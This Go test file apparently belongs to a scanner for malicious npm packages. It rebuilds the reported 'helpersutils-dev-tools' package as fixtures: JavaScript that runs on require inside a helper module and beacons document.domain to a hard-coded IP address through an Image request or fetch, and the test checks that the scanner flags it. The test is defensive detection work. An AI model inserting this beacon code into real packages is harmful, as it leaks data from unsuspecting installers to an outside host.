package intelligence

import "testing"

// helpersutils-dev-tools (row 56). MAL-2026-16465 (Amazon Inspector): the
// main module "executes an IIFE at require-time that issues an Image request
// to http://5.189.173.113:8899/csp-edu" with document.domain as a query
// parameter; bypass.js does the same to /csp.
//
// The bare-public-IPv4 rule (core/iocscan/scan.go findPublicIPURL) counts an
// IP only when the same file sends. Since v0.22.106 (F9) `new Image().src=`
// is a recognised send, so the DOCUMENTED shape is reported, not only a
// fetch() reconstruction.
func TestAttack2026_56_HelpersutilsDevTools_IOC(t *testing.T) {
	p := newIOCScanProvider()
	image := "(function(){try{var i=new Image();i.src='http://5.189.173.113:8899/csp-edu?d='+encodeURIComponent(document.domain);}catch(e){}})();\n" +
		"module.exports={isEmpty:function(o){return !o||Object.keys(o).length===0;}};\n"
	documented := atkBRun(t, p, "helpersutils-dev-tools", "1.0.11", atkBTarball(t, map[string]string{
		"package.json": `{"name":"helpersutils-dev-tools","version":"1.0.11","main":"index.js"}`,
		"index.js":     image,
		"bypass.js":    "(function(){new Image().src='http://5.189.173.113:8899/csp?d='+document.domain;})();\n",
	}))
	if !documented.MaliciousIOC || documented.MaliciousIOCKind != "exfil_host" || !documented.MaliciousIOCCoupled {
		t.Fatalf("Image-beacon shape: want coupled exfil_host MaliciousIOC, got %+v", documented)
	}

	viaFetch := atkBRun(t, p, "helpersutils-dev-tools", "1.0.11", atkBTarball(t, map[string]string{
		"package.json": `{"name":"helpersutils-dev-tools","version":"1.0.11","main":"index.js"}`,
		"index.js":     "(function(){fetch('http://5.189.173.113:8899/csp-edu?d='+document.domain,{mode:'no-cors'});})();\n",
	}))
	if !viaFetch.MaliciousIOC || viaFetch.MaliciousIOCKind != "exfil_host" {
		t.Fatalf("fetch-beacon reconstruction: want exfil_host MaliciousIOC, got %+v", viaFetch)
	}

	clean := atkBRun(t, p, "dev-helpers", "1.0.0", atkBTarball(t, map[string]string{
		"package.json": `{"name":"dev-helpers","version":"1.0.0","main":"index.js"}`,
		"index.js":     "module.exports={isEmpty:function(o){return !o||Object.keys(o).length===0;}};\n",
	}))
	if clean.MaliciousIOC {
		t.Fatalf("benign helpers flagged: %+v", clean)
	}
}
